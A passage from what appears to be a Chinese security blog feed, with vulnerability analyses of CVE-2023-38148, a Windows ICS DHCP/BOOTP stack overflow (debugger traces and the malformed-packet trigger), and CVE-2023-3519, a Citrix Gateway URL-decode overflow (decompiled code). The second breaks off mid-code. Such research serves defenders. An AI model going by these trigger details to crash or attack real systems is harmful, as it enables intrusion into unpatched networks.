style="color:#ae81ff">3</span>a<span style="color:#ae81ff">42</span><span style="color:#ae81ff">32</span><span style="color:#ae81ff">04</span> c0 a8<span style="color:#ae81ff">5.</span>.<span style="color:#f92672">=</span>....).<span style="color:#f92672">:</span>B2...</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000203</span><span style="color:#960050;background-color:#1e0010">`</span>faa1feb4<span style="color:#ae81ff">89</span> cd<span style="color:#ae81ff">0</span>c<span style="color:#ae81ff">0f</span><span style="color:#ae81ff">44</span><span style="color:#ae81ff">45</span><span style="color:#ae81ff">53</span><span style="color:#ae81ff">4</span>b<span style="color:#f92672">-</span><span style="color:#ae81ff">54</span><span style="color:#ae81ff">4f</span><span style="color:#ae81ff">50</span><span style="color:#ae81ff">2</span>d<span style="color:#ae81ff">54</span><span style="color:#ae81ff">35</span><span style="color:#ae81ff">50</span><span style="color:#ae81ff">37</span> ....DESKTOP<span style="color:#f92672">-</span>T5P7</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000203</span><span style="color:#960050;background-color:#1e0010">`</span>faa1fec4<span style="color:#ae81ff">34</span><span style="color:#ae81ff">45</span><span style="color:#ae81ff">53</span><span style="color:#ae81ff">51</span><span style="color:#ae81ff">12</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">44</span><span style="color:#ae81ff">45</span><span style="color:#ae81ff">53</span><span style="color:#ae81ff">4</span>b<span style="color:#ae81ff">54</span><span style="color:#ae81ff">4f</span><span style="color:#ae81ff">50</span><span style="color:#ae81ff">2</span>d<span style="color:#ae81ff">4</span>ESQ....DESKTOP<span style="color:#f92672">-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000203</span><span style="color:#960050;background-color:#1e0010">`</span>faa1fed4<span style="color:#ae81ff">54</span><span style="color:#ae81ff">35</span><span style="color:#ae81ff">50</span><span style="color:#ae81ff">37</span><span style="color:#ae81ff">34</span><span style="color:#ae81ff">45</span><span style="color:#ae81ff">53</span><span style="color:#ae81ff">3</span>c<span style="color:#f92672">-</span><span style="color:#ae81ff">08</span><span style="color:#ae81ff">4</span>d<span style="color:#ae81ff">53</span><span style="color:#ae81ff">46</span><span style="color:#ae81ff">54</span><span style="color:#ae81ff">20</span><span style="color:#ae81ff">35</span><span style="color:#ae81ff">2</span>e T5P74ES<span style="color:#f92672">&lt;</span>.MSFT<span style="color:#ae81ff">5.</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000203</span><span style="color:#960050;background-color:#1e0010">`</span>faa1fee4<span style="color:#ae81ff">30</span><span style="color:#ae81ff">37</span><span style="color:#ae81ff">0</span>e<span style="color:#ae81ff">01</span><span style="color:#ae81ff">03</span><span style="color:#ae81ff">06</span><span style="color:#ae81ff">0f</span><span style="color:#ae81ff">1f</span><span style="color:#f92672">-</span><span style="color:#ae81ff">21</span><span style="color:#ae81ff">2</span>b<span style="color:#ae81ff">2</span>c<span style="color:#ae81ff">2</span>e<span style="color:#ae81ff">2f</span><span style="color:#ae81ff">77</span><span style="color:#ae81ff">79</span> f9<span style="color:#ae81ff">07.</span>.....<span style="color:#f92672">!+</span>,.<span style="color:#f92672">/</span>wy.</span></span></code></pre></div><p><img alt="" src="/images/vulnerability/CVE-2023-38148-windows-ics-eop.zh-cn.assets/20230915124447.png"/></p><p>根据RFC<a href="https://datatracker.ietf.org/doc/html/rfc2132#page-4" target="_blank">rfc2132</a> option 53为传递DHCP消息类型，第一个字节是操作编号，第二个字节恒为1，第三个字节是消息类型，范围是1-9<img alt="" src="/images/vulnerability/CVE-2023-38148-windows-ics-eop.zh-cn.assets/20230915155551.png"/><img alt="" src="/images/vulnerability/CVE-2023-38148-windows-ics-eop.zh-cn.assets/20230915155648.png"/></p><p>根据代码，当DHCP中含有option 53一定会进入<code>DhcpExtractOptionsFromMessage</code>的<code>if ( BYTE1(v9->OptionID) )</code>，把<code>a3[1]</code>赋值为不为零的值。<img alt="" src="/images/vulnerability/CVE-2023-38148-windows-ics-eop.zh-cn.assets/20230915155756.png"/>
回到<code>DhcpProcessMessage</code>内，v13就不为0，不能进入触发漏洞的逻辑<img alt="" src="/images/vulnerability/CVE-2023-38148-windows-ics-eop.zh-cn.assets/20230915155919.png"/></p><p>重新构造DHCP数据包,，删除option53并将<code>Hardware address length</code>改为100，单步调试，成功进入到<code>DhcpAddArpEntry</code>函数内。</p><pre tabindex="0"><code>0:004> k
Child-SP RetAddr Call Site
0000000e`3487f2a0 00007ff9`c0016766 ipnathlp!DhcpAddArpEntry+0x14a
0000000e`3487f380 00007ff9`c0017797 ipnathlp!DhcpProcessBootpMessage+0x5ea
0000000e`3487f480 00007ff9`c00143a4 ipnathlp!DhcpProcessMessage+0x123
0000000e`3487f540 00007ff9`c0006ecf ipnathlp!DhcpReadCompletionRoutine+0x644
0000000e`3487f5a0 00007ff9`eebe32ea ipnathlp!NhpIoCompletionRoutine+0x6f
0000000e`3487f5d0 00007ff9`eeb22f86 ntdll!RtlpTpIoCallback+0xca
0000000e`3487f610 00007ff9`ee0a7614 ntdll!TppWorkerThread+0x456
0000000e`3487f910 00007ff9`eeb226b1 KERNEL32!BaseThreadInitThunk+0x14
0000000e`3487f940 00000000`00000000 ntdll!RtlUserThreadStart+0x21</code></pre><p>在调试器中可以看到，执行memcpy时长度参数为0x64，继续运行则触发了栈溢出，进程异常退出。</p><pre tabindex="0"><code>0:005> g
Breakpoint 9 hit
ipnathlp!DhcpAddArpEntry+0x184:
00007ff9`c0012570 e83db80600 call ipnathlp!memcpy (00007ff9`c007ddb2)
0:005> rr8
r8=0000000000000064
0:005> g
STATUS_STACK_BUFFER_OVERRUN encountered
(1858.3b4): Break instruction exception - code 80000003 (first chance)
KERNELBASE!UnhandledExceptionFilter+0x7c:
00007ff9`ec55dd3c cc int 3
0:005> k
Child-SP RetAddr Call Site
0000000e`34b7efa0 00007ff9`c007d096 KERNELBASE!UnhandledExceptionFilter+0x7c
0000000e`34b7f0c0 00007ff9`c007d229 ipnathlp!_raise_securityfailure+0x1a
0000000e`34b7f0f0 00007ff9`c0012600 ipnathlp!_report_gsfailure+0x169
0000000e`34b7f180 00007ff9`c0016766 ipnathlp!DhcpAddArpEntry+0x214
0000000e`34b7f260 00007ff9`c0017797 ipnathlp!DhcpProcessBootpMessage+0x5ea
0000000e`34b7f360 00007ff9`c00143a4 ipnathlp!DhcpProcessMessage+0x123
0000000e`34b7f420 00007ff9`c0006ecf ipnathlp!DhcpReadCompletionRoutine+0x644
0000000e`34b7f480 00007ff9`eebe32ea ipnathlp!NhpIoCompletionRoutine+0x6f
0000000e`34b7f4b0 00007ff9`eeb22f86 ntdll!RtlpTpIoCallback+0xca
0000000e`34b7f4f0 00007ff9`ee0a7614 ntdll!TppWorkerThread+0x456
0000000e`34b7f7f0 00007ff9`eeb226b1 KERNEL32!BaseThreadInitThunk+0x14
0000000e`34b7f820 00000000`00000000 ntdll!RtlUserThreadStart+0x21
0:005> g
ntdll!NtWaitForWorkViaWorkerFactory+0x14:
00007ff9`eeb70aa4 c3 ret</code></pre><p>wireshrk中可以看到数据包协议为Bootp。<img alt="" src="/images/vulnerability/CVE-2023-38148-windows-ics-eop.zh-cn.assets/20230918152845.png"/></p><p>PoC参考<a href="https://github.com/samueldotj/dhcp-client" target="_blank">简单实现的DHCP Client</a>并将option 53注释，将<code>Hardware address length</code>改为0x100。
这个栈溢出长度和内容均为内容可控</p><h3 id="小结">小结</h3><p>这个漏洞起源于memcpy时src和len参数均来源于数据包内，为用户可控，导致攻击者可以通过设置过长长度触发memcpy越界写入，触发时的漏洞函数为处理BOOTP协议，这个协议是DHCP协议前身，DHCP兼容这个协议，在处理Bootp消息时，没有检查长度导致在复制mac时出错。</p><p><strong>参考链接</strong></p><blockquote><p><a href="https://bbs.kanxue.com/thread-278835.htm" target="_blank">https://bbs.kanxue.com/thread-278835.htm</a></p><p><a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/preparing-to-debug-the-service-application#-enabling-the-debugging-of-the-initialization-code" target="_blank">https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/preparing-to-debug-the-service-application#-enabling-the-debugging-of-the-initialization-code</a></p></blockquote><p><strong>Created at 2023-09-18T16:18:40+08:00</strong></p></description></item><item><title>CVE-2023-3519 Cirtix Gateway RCE分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-3519-cirtix-gateway-rce/</link><pubDate>Thu, 27 Jul 2023 10:48:40 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-3519-cirtix-gateway-rce/</guid><description><h3 id="基本信息">基本信息</h3><p>Citrix ADC 及 Citrix Gateway 中存在缓冲区溢出漏洞，未授权的攻击者可以通过发送特殊请求触发漏洞，造成RCE。</p><h3 id="影响版本">影响版本</h3><p>NetScaler ADC 、NetScaler Gateway 13.1 &lt; 13.1-49.13
NetScaler ADC 、NetScaler Gateway 13.0 &lt; 13.0-91.13
NetScaler ADC 13.1-FIPS &lt; 13.1-37.159
NetScaler ADC 12.1-FIPS &lt; 12.1-55.297
NetScaler ADC 12.1-NDcPP &lt; 12.1-55.297</p><h3 id="环境搭建">环境搭建</h3><p>申请开发者试用，配置Citrix Gateway<img alt="aa" src="/images/vulnerability/CVE-2023-3519-Cirtix-Gateway-RCE.zh-cn.assets/3.png"/></p><h3 id="技术分析调试">技术分析&amp;调试</h3><p>根据国外安全研究员研究，该漏洞存在于<code>/netscaler/nsppe</code>文件内，diff修复前和修复后的<code>nsppe</code>，主要修改了<code>ns_aaa_gwtest_get_event_and_target_names</code>等几个函数<img alt="" src="/images/vulnerability/CVE-2023-3519-Cirtix-Gateway-RCE.zh-cn.assets/1.png"/></p><p>转到<code>ns_aaa_gwtest_get_event_and_target_names</code>函数，对比修复和未修复的代码，主要在调用<code>ns_aaa_saml_url_decode</code>函数时对v29添加了校验。<img alt="" src="/images/vulnerability/CVE-2023-3519-Cirtix-Gateway-RCE.zh-cn.assets/2.png"/></p><p>跟进<code>ns_aaa_saml_url_decode</code>函数，进入<code>ns_aaa_saml_url_decode_inner</code></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span><span style="color:#66d9ef">__fastcall</span><span style="color:#a6e22e">ns_aaa_saml_url_decode</span>(<span style="color:#66d9ef">__int64</span> a1,<span style="color:#66d9ef">__int64</span> a2,<span style="color:#66d9ef">__int64</span> a3)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#a6e22e">ns_aaa_saml_url_decode_inner</span>(a1, a2, a3,<span style="color:#ae81ff">1LL</span>);</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>在<code>ns_aaa_saml_url_decode_inner</code>函数中a1是一个char指针，指向了http请求的url，在do while循环时遍历a1数组，当当前a1指向的字符是%，则获取到该字符后面两个字符通过<code>datatable_ascii2bin</code>得到对应的字符并写入到v4指向的数组内，实际上这里是url解码操作，解码后写入v4数组。
如果当前字符不是%则判断是不是+号，是+号则在v4数组内写入空格。两个都不是则直接写入到v4内，可以看出这块代码是在对传入的字符串判断是否为url编码如果是则进行url解码，如果不是则直接写入v4数组。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span><span style="color:#66d9ef">__fastcall</span><span style="color:#a6e22e">ns_aaa_saml_url_decode_inner</span>(<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>a1, _BYTE<span style="color:#f92672">*</span>a2,<span style="color:#66d9ef">int</span> a3,<span style="color:#66d9ef">int</span> a4)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span> _BYTE<span style="color:#f92672">*</span>v4;<span style="color:#75715e">// rax</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int64</span> v5;<span style="color:#75715e">// r8</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">char</span> v6;<span style="color:#75715e">// bl</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>v7;<span style="color:#75715e">// r9</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">char</span> v8;<span style="color:#75715e">// r10</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">char</span> v9;<span style="color:#75715e">// r11</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/></span></span><span style="display:flex;"><span><span style="color:#a6e22e">LODWORD</span>(v4)<span style="color:#f92672">=</span> (_DWORD)a2;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( a3 )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v5<span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>a1[a3];</span></span><span style="display:flex;"><span> v4<span style="color:#f92672">=</span> a2;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">do</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v6<span style="color:#f92672">=</span><span style="color:#f92672">*</span>a1;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>a1<span style="color:#f92672">==</span><span style="color:#e6db74">'%'</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v7<span style="color:#f92672">=</span> a1<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int64</span>)(a1<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>)<span style="color:#f92672">&lt;</span> v5 )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v8<span style="color:#f92672">=</span> a1[<span style="color:#ae81ff">1</span>];</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int8</span>)(v8<span style="color:#f92672">-</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&lt;=</span><span style="color:#ae81ff">9u</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v9<span style="color:#f92672">=</span><span style="color:#f92672">*</span>v7;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int8</span>)(<span style="color:#f92672">*</span>v7<span style="color:#f92672">-</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0xAu</span><span style="color:#f92672">||</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int8</span>)((v9<span style="color:#f92672">|</span><span style="color:#ae81ff">0x20</span>)<span style="color:#f92672">-</span><span style="color:#ae81ff">97</span>)<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">6u</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v9<span style="color:#f92672">!=</span><span style="color:#ae81ff">53</span> )</span></span><span style="display:flex;"><span> v7<span style="color:#f92672">=</span> a1;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int64</span>)(a1<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>)<span style="color:#f92672">>=</span> v5 )</span></span><span style="display:flex;"><span> v7<span style="color:#f92672">=</span> a1;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v8<span style="color:#f92672">!=</span><span style="color:#ae81ff">50</span> )</span></span><span style="display:flex;"><span> v7<span style="color:#f92672">=</span> a1;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>a4 )</span></span><span style="display:flex;"><span> v7<span style="color:#f92672">=</span> a1;</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>v4<span style="color:#f92672">=</span> datatable_ascii2bin[(<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int8</span>)v7[<span style="color:#ae81ff">2</span>]]<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span><span style="color:#f92672">*</span> datatable_ascii2bin[(<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int8</span>)v7[<span style="color:#ae81ff">1</span>]];</span></span><span style="display:flex;"><span> a1<span style="color:#f92672">=</span> v7<span style="color:#f92672">+</span><span style="color:#ae81ff">3</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_4;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span><span style="color:#66d9ef">if</span> ( v6<span style="color:#f92672">==</span><span style="color:#e6db74">'+'</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>v4<span style="color:#f92672">=</span><span style="color:#ae81ff">32</span>;</span></span><span style="display:flex;"><span><span style="color:#f92672">++</span>a1;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_4;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#f92672">++</span>a1;</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>v4<span style="color:#f92672">=</span> v6;</span></span><span style="display:flex;"><span>LABEL_4:</span></span><span style="display:flex;"><span><span style="color:#f92672">++</span>v4;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> ( (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int64</span>)a1<span style="color:#f92672">&lt;</span> v5 );</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)((_DWORD)v4<span style="color:#f92672">-</span> (_DWORD)a2);</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>在循环中，写入的数组来源于传入的参数a2，并且do while循环结束是通过判断<code>a1 &lt; v5</code>，<code>v5 = &amp;a1[a3];</code>a1是传入的char数组，a3是传入的int。向上追溯调用参数来源。<code>ns_aaa_saml_url_decode</code>函数的v5最终来源于传入的a1参数，a2为传入的参数，v25来源于<code>*(a1+174)</code>。不难猜测a1应为一个结构体指针，该指针指向的结构体中存储了指向存储请求url的char数组及该数组的长度，该段代码为解析url的各个参数，并根据参数不同进行的操作。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span><span style="color:#66d9ef">__fastcall</span><span style="color:#a6e22e">ns_aaa_gwtest_get_event_and_target_names</span>(<span style="color:#66d9ef">__int64</span> a1,<span style="color:#66d9ef">__int64</span> a2,<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>a3)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span> v3;<span style="color:#75715e">// r13d</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>v4;<span style="color:#75715e">// rbx</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> v5;<span style="color:#75715e">// r12</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span> v6;<span style="color:#75715e">// r14d</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> v7;<span style="color:#75715e">// r13</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> v8;<span style="color:#75715e">// r12</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">int</span> v9;<span style="color:#75715e">// r8d</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> v10;<span style="color:#75715e">// r10</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int16</span> v11;<span style="color:#75715e">// ax</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> v12;<span style="color:#75715e">// rcx</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span> v13;<span style="color:#75715e">// eax</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">int</span> v14;<span style="color:#75715e">// ecx</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">bool</span> v15;<span style="color:#75715e">// cf</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">int</span> v16;<span style="color:#75715e">// eax</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> v17;<span style="color:#75715e">// rcx</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">int</span> v19;<span style="color:#75715e">// r14d</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> v20;<span style="color:#75715e">// rax</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">int</span> v21;<span style="color:#75715e">// ecx</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span> v22;<span style="color:#75715e">// r13d</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> v23;<span style="color:#75715e">// rax</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span> v24;<span style="color:#75715e">// edx</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> v25;<span style="color:#75715e">// rdx</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">int</span> v26;<span style="color:#75715e">// eax</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span> v27;<span style="color:#75715e">// [rsp+0h] [rbp-50h]</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> v28;<span style="color:#75715e">// [rsp+18h] [rbp-38h] BYREF</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> v29;<span style="color:#75715e">// [rsp+20h] [rbp-30h]</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/></span></span><span style="display:flex;"><span> v3<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int16</span><span style="color:#f92672">*</span>)(a1<span style="color:#f92672">+</span><span style="color:#ae81ff">174</span>);</span></span><span style="display:flex;"><span> v27<span style="color:#f92672">=</span> v3<span style="color:#f92672">-</span><span style="color:#ae81ff">17</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v3<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0x20</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v4<span style="color:#f92672">=</span> a3;</span></span><span style="display:flex;"><span> v5<span style="color:#f92672">=</span><span style="color:#ae81ff">0LL</span>;</span></span><span style="display:flex;"><span> v6<span style="color:#f92672">=</span><span style="color:#ae81ff">1441793</span>;</span></span><span style="display:flex;"><span> v7<span style="color:#f92672">=</span><span style="color:#ae81ff">0LL</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_7;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> v8<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(a1<span style="color:#f92672">+</span><span style="color:#ae81ff">36</span>);</span></span><span style="display:flex;"><span> v29<span style="color:#f92672">=</span> v8<span style="color:#f92672">+</span><span style="color:#ae81ff">17</span>;</span></span><span style="display:flex;"><span> v4<span style="color:#f92672">=</span> a3;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">strncmp</span>(<span style="color:#e6db74">"event="</span>, v8<span style="color:#f92672">+</span><span style="color:#ae81ff">17</span>,<span style="color:#ae81ff">6LL</span>) )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v6<span style="color:#f92672">=</span><span style="color:#ae81ff">1441800</span>;</span></span><span style="display:flex;"><span>LABEL_5:</span></span><span style="display:flex;"><span> v5<span style="color:#f92672">=</span><span style="color:#ae81ff">0LL</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_6;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>(<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">strncmp</span>(v8<span style="color:#f92672">+</span><span style="color:#ae81ff">23</span>,<span style="color:#e6db74">"start&amp;"</span>,<span style="color:#ae81ff">6LL</span>) )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v19<span style="color:#f92672">=</span><span style="color:#f92672">-</span><span style="color:#ae81ff">29</span>;</span></span><span style="display:flex;"><span> v20<span style="color:#f92672">=</span><span style="color:#ae81ff">29LL</span>;</span></span><span style="display:flex;"><span> v21<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">strncmp</span>(v8<span style="color:#f92672">+</span><span style="color:#ae81ff">23</span>,<span style="color:#e6db74">"done&amp;"</span>,<span style="color:#ae81ff">5LL</span>) )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v6<span style="color:#f92672">=</span><span style="color:#ae81ff">1441801</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_5;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> v19<span style="color:#f92672">=</span><span style="color:#f92672">-</span><span style="color:#ae81ff">28</span>;</span></span><span style="display:flex;"><span> v20<span style="color:#f92672">=</span><span style="color:#ae81ff">28LL</span>;</span></span><span style="display:flex;"><span> v21<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>v4<span style="color:#f92672">=</span> v21;</span></span><span style="display:flex;"><span> v5<span style="color:#f92672">=</span> v20<span style="color:#f92672">+</span> v8;</span></span><span style="display:flex;"><span> v22<span style="color:#f92672">=</span> v3<span style="color:#f92672">+</span> v19;</span></span><span style="display:flex;"><span> v6<span style="color:#f92672">=</span><span style="color:#ae81ff">1441802</span>;</span></span><span style="display:flex;"><span> v27<span style="color:#f92672">=</span> v22;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">strncmp</span>(<span style="color:#e6db74">"target="</span>, v5,<span style="color:#ae81ff">7LL</span>) )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_6;</span></span><span style="display:flex;"><span> v23<span style="color:#f92672">=</span><span style="color:#a6e22e">_wrap_memchr</span>(v5<span style="color:#f92672">+</span><span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">38LL</span>, (<span style="color:#66d9ef">int</span>)(v22<span style="color:#f92672">-</span><span style="color:#ae81ff">7</span>));</span></span><span style="display:flex;"><span> v24<span style="color:#f92672">=</span> v22<span style="color:#f92672">-</span><span style="color:#ae81ff">7</span>;</span></span><span style="display:flex;"><span> v25<span style="color:#f92672">=</span> v24<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (_DWORD)v25<span style="color:#f92672">!=</span> v22<span style="color:#f92672">-</span><span style="color:#ae81ff">6</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span>LABEL_6:</span></span><span style="display:flex;"><span> v7<span style="color:#f92672">=</span> v29;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_7;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> v26<span style="color:#f92672">=</span><span style="color:#a6e22e">ns_aaa_saml_url_decode</span>(v5<span style="color:#f92672">+</span><span style="color:#ae81ff">7</span>, a2, 